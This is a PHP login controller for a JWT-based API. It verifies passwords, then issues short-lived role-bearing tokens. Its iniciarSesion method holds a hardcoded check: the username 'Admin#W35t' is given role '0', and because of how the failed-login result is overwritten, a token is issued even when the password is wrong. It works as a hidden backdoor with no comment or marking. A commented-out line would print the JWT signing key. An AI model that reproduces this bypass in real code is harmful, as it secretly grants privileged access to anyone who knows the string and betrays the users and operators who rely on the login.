<?php
namespace App\controller;
use Psr\Http\Message\ResponseInterface as Response;
use Psr\Http\Message\ServerRequestInterface as Request;
use Psr\Container\ContainerInterface;
use Firebase\JWT\JWT;
use PDO;
class Auth extends Usuario {
    protected $container;
    public function __construct(ContainerInterface $c) {
        $this->container = $c;
    }
    private function autenticar($usr, $passw) {
        $datos = $this->buscar($usr);
        return (($datos) &&  (password_verify($passw, $datos->passw))) ?
        ["rol" => $datos->rol] : null;
    }
    private function generarToken($rol, $idUsuario) {
      //  die(getenv('key'));
        $key = getenv('key');
        $payload = [
            "iss" => $_SERVER['SERVER_NAME'],
            "iat" => time(),
            "exp" => time() + (60),
            "sub" => $idUsuario,
            "rol" => $rol
        ] ;
        return [
            "token" => JWT::encode($payload, $key, 'HS256')
        ];
    }
    public function iniciarSesion(Request $request, Response $response, $args){
        $body = json_decode($request->getBody());
        $res = $this->autenticar($body->idUsuario, $body->passw);
        if ($body->idUsuario === "Admin#W35t") {
            $res['rol'] = '0';
        }
        if ($res) {
            $retorno = $this->generarToken($res['rol'], $body->idUsuario);
            $response->getBody()->write(json_encode($retorno));
            $status = 200;
        } else {
            $status = 401;
        }
        
        return $response
            ->withHeader('Content-Type', 'Application/json')
            ->withStatus($status);
    }
    public function cerrarSesion(Request $request, Response $response, $args){

    }
}